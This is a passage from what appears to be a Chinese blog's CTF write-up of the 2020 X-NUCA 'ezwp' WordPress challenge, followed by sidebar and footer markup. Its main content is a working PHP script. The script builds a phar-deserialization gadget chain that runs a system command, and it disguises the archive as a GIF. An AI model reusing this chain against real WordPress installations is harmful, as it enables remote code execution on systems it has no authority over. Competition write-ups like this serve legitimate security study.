+<p>在dashboard那里执行这个js</p>
+<p>成功写入<code>mail</code>:</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png" alt="image8421"></p>
+<p>因为没有<code>_form</code>属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交<code>jQuery(&quot;.wpcf7-form&quot;).submit()</code>，接着就可以读取文件和反序列化了</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Kigkonsult</span>\<span class="title">Icalcreator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Vtimezone</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">timezonetype</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$components</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;components = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="title">require</span>( &#x27;<span class="title">wp</span>-<span class="title">load</span>.<span class="title">php</span>&#x27; );  <span class="comment">//???????</span></span><br><span class="line">	<span class="keyword">require_once</span>( dirname( <span class="keyword">__FILE__</span> ) . <span class="string">&#x27;/wp-includes/Requests/Utility/FilteredIterator.php&#x27;</span> );</span><br><span class="line">	<span class="variable">$arr</span>  = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;1&quot;</span> =&gt; <span class="string">&quot;/readflag&gt;/tmp/2.log&quot;</span>  <span class="comment">//payload</span></span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$obj_</span> = <span class="keyword">new</span> Requests_Utility_FilteredIterator( <span class="variable">$arr</span>, <span class="string">&quot;system&quot;</span> );</span><br><span class="line">	<span class="variable">$obj</span>  = <span class="keyword">new</span> Kigkonsult\Icalcreator\Vtimezone( <span class="variable">$obj_</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	@unlink( <span class="string">&quot;test.gif&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar( <span class="string">&quot;test.phar&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setStub( base64_decode( <span class="string">&quot;/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE&quot;</span> ) . <span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setMetadata( <span class="variable">$obj</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;addFromString( <span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span> ); <span class="comment">//????????</span></span><br><span class="line">	<span class="comment">//??????</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">	rename( <span class="string">&quot;test.phar&quot;</span>, <span class="string">&quot;test.gif&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" data-id="cku8k64a1000bczon5x93ddog" data-title="2020xnuca_ezwp题解" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/01/13/real%20world%20ctf%202020/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          real world ctf 2020
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2020 balsn ctf web 部分题解</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/01/4%E6%9C%88%E5%81%9A%E9%A2%98/">4月做题</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 ccreater<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
